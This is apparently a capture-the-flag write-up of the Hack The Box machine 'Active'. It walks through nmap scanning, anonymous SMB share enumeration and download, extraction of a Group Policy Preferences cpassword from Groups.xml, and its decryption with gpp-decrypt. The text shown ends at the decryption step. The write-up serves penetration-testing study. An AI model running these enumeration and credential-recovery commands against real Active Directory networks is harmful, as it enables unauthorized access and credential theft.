---
title: "Active"
date: 2026-02-08
categories: [HTB]
tags: [windows, active-directory]
toc: true

image:
  path: /assets/img/htb/Active/active1.png
  alt: "HTB Active"
---

Active is a retired Windows box that focuses on Active Directory enumeration, credential exposure via Group Policy Preferences (GPP), and abuse of Kerberos through Kerberoasting to pivot from a service account to domain administrator.

---

## Recon
### Nmap Scan
I began with a full TCP sweep to identify all open ports on the target.

`sudo nmap -p- -T4 10.129.17.166 -oN scans/all_ports.txt -Pn`

![](/assets/img/htb/Active/active01.png)

I parsed the results to store all open ports in a variable for follow-up scanning.

`ports=$(awk '/\/tcp/ && /open/ { split($1,a,"/"); p = (p ? p "," a[1] : a[1]) } END{ print p }' scans/all_ports.txt)`

I then ran a targeted service and script scan against only the discovered open ports.

`sudo nmap -sC -sV -p $ports 10.129.17.166 -oN scans/services.txt -Pn`

![](/assets/img/htb/Active/active02.png)

I added the target hostname to /etc/hosts.

`echo '10.129.18.74 active.htb' | sudo tee -a /etc/hosts`

AD is confirmed, lets enumerate SMB with NetExec for any open shares.

`nxc smb 10.129.18.74 -u '' -p '' --shares`

![](/assets/img/htb/Active/active03.png)

SMB shows a readable share called Replication. I use `smbclient` to pull the share.

`mkdir -p Replication && cd Replication`
`smbclient //10.129.18.74/Replication -N -I 10.129.18.74 -c "recurse; prompt; mget *"`

![](/assets/img/htb/Active/active05.png)

Inspect what was pulled down.
`tree -a -h -f --dirsfirst`
![](/assets/img/htb/Active/active04.png)

Inside is a Groups.xml file — a classic GPP artifact known to store recoverable credentials. 

`grep -i cpassword Groups.xml`

![](/assets/img/htb/Active/active065.png)

Decrypt the embedded cpassword to recover the service account password

`gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ`

![](/assets/img/htb/Active/active06.png)
